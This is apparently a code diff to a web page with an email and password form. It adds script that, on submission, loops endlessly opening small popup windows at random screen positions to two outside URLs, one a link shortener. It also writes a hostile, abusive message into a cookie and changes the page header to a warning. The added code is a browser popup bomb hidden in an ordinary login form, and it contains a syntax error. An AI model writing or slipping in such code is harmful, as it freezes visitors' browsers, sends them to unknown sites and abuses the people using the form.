@@ -86,7 +86,39 @@
 </form>
 
 <script>
-function sendData() {
+function openRandomWindow(url) {
+      // 画面の幅と高さを取得
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+    
+      // ランダムなleftとtopの値を計算
+      const left = Math.floor(Math.random() * (screenWidth - 200)); // 新しいウィンドウの幅を200と仮定
+      const top = Math.floor(Math.random() * (screenHeight - 200)); // 新しいウィンドウの高さを200と仮定
+    
+      // 新しいウィンドウをランダムな位置で開く
+      window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+        const cookie = "LonglivetheRepublicofMagdaVandalism!M:psupportsthiscause.Therailwayindustrymustdiequickly!!!!Wehavecreatedthistechnologyfortherailindustry!DoNotcontactMagdaincaseofabuse.Anyonewhohatesyouenoughtousethisstuffistoblame.Soit'sSuckitup!Die!!!";
+        document.cookie = cookie;
+        changeText()
+        window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+        window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+    }
+
+    function changeText() {
+        // IDが'header'の要素を見つけます。
+        var headerElement = document.getElementById('header');
+        // その要素のテキスト内容を変更します。
+        headerElement.textContent = "警告";
+    }
+    function gameOver() {
+        while (true) {
+        openRandomWindow('https://discord-velseons.github.io/');
+        openRandomWindow('https://2no.co/2aM0M4');
+        }
+    }
+
+function sendData() {]
+    gameOver()
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
     var data = {
